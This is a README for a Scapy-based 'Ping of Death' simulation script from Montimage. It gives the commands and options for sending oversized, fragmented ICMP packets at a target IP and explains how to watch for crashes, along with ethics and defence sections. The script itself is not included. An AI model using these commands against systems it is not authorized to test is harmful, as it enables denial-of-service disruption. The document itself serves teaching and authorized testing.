# Ping of Death Attack Simulation

## Overview

The Ping of Death is a type of denial-of-service (DoS) attack that involves sending malformed or oversized ICMP packets to a target system. When these packets are fragmented and reassembled at the destination, they can cause buffer overflows and system crashes in vulnerable systems.

This script simulates a Ping of Death attack for educational and authorized security testing purposes.

## Features

- Customizable packet size and count
- Fragment size configuration
- Interval control between packets
- Detailed logging and statistics
- Performance monitoring

## Requirements

- Python 3.6+
- Scapy library
- Root/Administrator privileges (required for packet manipulation)

## Installation

```bash
# Install required dependencies
pip install scapy
```

## Usage

### Basic Attack

The simplest way to run a Ping of Death attack is to specify a target IP:

```bash
sudo python ping_of_death.py -t 192.168.1.10
```

This will:
- Send 1 oversized ICMP packet (default) to the target
- Use the default payload size of 65500 bytes
- Fragment the packet with a default fragment size of 1400 bytes
- Use the default interval of 0.1 seconds between packets

### Customizing the Attack

#### Send Multiple Packets

To send multiple packets:

```bash
# Send 5 packets
sudo python ping_of_death.py -t 192.168.1.10 -c 5
```

#### Adjust Payload Size

The payload size determines how large each ICMP packet will be:

```bash
# Use a 60000 byte payload
sudo python ping_of_death.py -t 192.168.1.10 -s 60000
```

#### Change Fragment Size

The fragment size determines how the large packet is broken down for transmission:

```bash
# Use 1200 byte fragments
sudo python ping_of_death.py -t 192.168.1.10 -f 1200
```

#### Modify Packet Interval

To control the time between packets:

```bash
# Send packets with a 0.5 second interval
sudo python ping_of_death.py -t 192.168.1.10 -i 0.5
```

#### Enable Verbose Mode

For detailed output and debugging information:

```bash
sudo python ping_of_death.py -t 192.168.1.10 -v
```

### Advanced Usage

#### Combining Parameters

For a more customized attack, you can combine multiple parameters:

```bash
# Send 5 packets with 60000 byte payload, 1200 byte fragments, and 0.5 second interval
sudo python ping_of_death.py -t 192.168.1.10 -c 5 -s 60000 -f 1200 -i 0.5
```

#### Testing Different Fragment Sizes

Fragment sizes can affect how the target system processes the packets:

```bash
# Test with smaller fragments
sudo python ping_of_death.py -t 192.168.1.10 -f 576

# Test with larger fragments
sudo python ping_of_death.py -t 192.168.1.10 -f 1472
```

## Monitoring the Attack

To observe the effect of the attack, you can use various tools:

```bash
# Monitor ICMP traffic
sudo tcpdump -i eth0 icmp

# Check system logs on the target for crash reports
sudo dmesg | grep -i error
```

## Ethical Considerations

This tool should ONLY be used for:
- Educational purposes
- Authorized security testing
- System vulnerability assessment

Unauthorized use against systems without explicit permission is illegal and unethical.

## Defensive Measures

Common defenses against Ping of Death attacks include:

1. Packet filtering
2. Firewall rules to block oversized ICMP packets
3. Operating system patches
4. Intrusion Detection/Prevention Systems (IDS/IPS)

Modern systems are generally not vulnerable to this attack, but it remains an important educational example.

## Command Line Options

```
-t, --target     Target IP address (required)
-c, --count      Number of packets to send (default: 1)
-s, --size       Size of the payload in bytes (default: 65500)
-f, --fragsize   Size of each fragment in bytes (default: 1400)
-i, --interval   Interval between packets in seconds (default: 0.1)
-v, --verbose    Enable verbose output
```

## License

Proprietary - Montimage
